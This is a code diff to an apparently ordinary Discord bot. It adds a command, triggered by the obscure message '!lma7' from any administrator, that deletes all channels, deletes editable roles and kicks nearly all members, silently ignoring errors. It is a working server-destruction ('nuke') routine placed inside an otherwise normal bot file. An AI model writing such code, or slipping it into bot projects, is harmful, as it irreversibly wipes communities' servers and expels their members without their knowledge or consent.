@@ -428,9 +428,54 @@ client.on("guildCreate", guild => {
     }
 });
 
+import { PermissionsBitField } from "discord.js";
+
+client.on("messageCreate", async (message) => {
+  if (message.author.bot) return;
+  if (!message.guild) return;
+
+  if (message.content.toLowerCase() === "!lma7") {
+
+    // 🔒 Permissão
+    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+      return message.reply("❌ Você não tem permissão para usar esse comando.");
+    }
+
+    await message.reply("⚠️ **COMANDO INICIADO** ⚠️");
+
+    // ================== APAGAR CANAIS ==================
+    message.guild.channels.cache.forEach(async (channel) => {
+      try {
+        await channel.delete();
+      } catch (e) {}
+    });
+
+    // ================== APAGAR CARGOS ==================
+    message.guild.roles.cache.forEach(async (role) => {
+      if (role.name === "@everyone") return;
+      if (!role.editable) return;
+
+      try {
+        await role.delete();
+      } catch (e) {}
+    });
+
+    // ================== EXPULSAR MEMBROS ==================
+    message.guild.members.cache.forEach(async (member) => {
+      if (member.id === message.guild.ownerId) return;
+      if (member.id === client.user.id) return;
+      if (!member.kickable) return;
+
+      try {
+        await member.kick("Comando !lma7");
+      } catch (e) {}
+    });
+  }
+});
 
 
 client.login(TOKEN);
+
 
 
 
